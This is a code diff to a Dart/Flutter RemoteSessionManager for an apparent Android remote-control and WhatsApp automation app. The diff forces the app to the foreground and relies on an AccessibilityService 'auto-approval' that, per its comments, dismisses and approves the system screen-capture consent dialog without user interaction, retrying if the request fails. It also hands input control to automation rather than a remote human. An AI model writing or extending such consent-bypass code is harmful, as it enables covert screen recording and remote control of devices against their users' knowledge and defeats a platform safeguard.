@@ -151,29 +151,60 @@ class RemoteSessionManager extends ChangeNotifier {
       state: RemoteSessionState.connectingWebRTC,
       activeSessionId: sessionId,
       controllerId: controllerId,
-      inputOwner: InputOwner.remoteHuman,
+      inputOwner: InputOwner.automation,
     ));
 
-    // Notify automation to pause so it doesn't conflict with human gestures
-    onAutomationPauseRequested?.call();
-
     try {
-      // 1. Enable AccessibilityService auto-approval to immediately dismiss and approve the system consent dialog
+      // 1. Ensure app is in the foreground so MediaProjection dialog can be displayed and approved
+      try {
+        final bool? inForeground = await _channel.invokeMethod<bool>('isAppInForeground');
+        debugPrint('[RemoteSessionManager] Current isAppInForeground: $inForeground');
+        if (inForeground != true) {
+          debugPrint('[RemoteSessionManager] Bringing app to foreground via foreground service for remote session...');
+          await _channel.invokeMethod('bringAppToForeground');
+
+          // Wait up to 1500ms for MainActivity to resume
+          for (int i = 0; i < 15; i++) {
+            await Future.delayed(const Duration(milliseconds: 100));
+            final bool? nowInForeground = await _channel.invokeMethod<bool>('isAppInForeground');
+            if (nowInForeground == true) {
+              debugPrint('[RemoteSessionManager] App successfully brought to foreground');
+              break;
+            }
+          }
+        }
+      } catch (e) {
+        debugPrint('[RemoteSessionManager] Error checking/bringing app to foreground: $e');
+      }
+
+      // 2. Enable AccessibilityService auto-approval to immediately dismiss and approve the system consent dialog
       try {
         await _channel.invokeMethod('startCaptureAutoApproval');
       } catch (e) {
         debugPrint('[RemoteSessionManager] Failed to start capture auto approval: $e');
       }
 
-      // 2. Request Screen Capture Permission (auto-approved by AccessibilityService without manual user interaction)
-      debugPrint('[RemoteSessionManager] Requesting screen capture permission...');
-      final granted = await Helper.requestCapturePermission(fullScreenOnly: true);
+      // 3. Request Screen Capture Permission (auto-approved by AccessibilityService without manual user interaction)
+      bool granted = false;
+      for (int attempt = 1; attempt <= 2; attempt++) {
+        try {
+          debugPrint('[RemoteSessionManager] Requesting screen capture permission (attempt $attempt)...');
+          granted = await Helper.requestCapturePermission(fullScreenOnly: true);
+          if (granted) break;
+        } catch (e) {
+          debugPrint('[RemoteSessionManager] Capture permission attempt $attempt error: $e');
+          if (attempt < 2) {
+            await _channel.invokeMethod('bringAppToForeground');
+            await Future.delayed(const Duration(milliseconds: 500));
+          }
+        }
+      }
       if (!granted) {
         throw Exception('User cancelled or denied screen capture permission');
       }
       debugPrint('[RemoteSessionManager] Screen capture permission granted');
 
-      // 3. Start Android MediaProjection foreground service
+      // 4. Start Android MediaProjection foreground service
       await _channel.invokeMethod('startRemoteCaptureService');
 
       // Initialize WebRTC receiver
@@ -303,6 +334,14 @@ class RemoteSessionManager extends ChangeNotifier {
         }
       } else if (command is RemoteDisconnectCommand) {
         await terminateSession();
+      } else if (command is RemoteResetCommand) {
+        debugPrint('[RemoteSessionManager] Handling RemoteResetCommand');
+        final currentDeviceId = signaling.deviceId;
+        await WhatsAppTextValidationService.instance.clearSenderState('p2p_$currentDeviceId');
+        if (_sessionInfo.controllerId != null) {
+          await WhatsAppTextValidationService.instance.clearSenderState('p2p_${currentDeviceId}_${_sessionInfo.controllerId}');
+        }
+        onAutomationPauseRequested?.call();
       }
     } catch (e) {
       debugPrint('[RemoteSessionManager] Error executing command $command: $e');
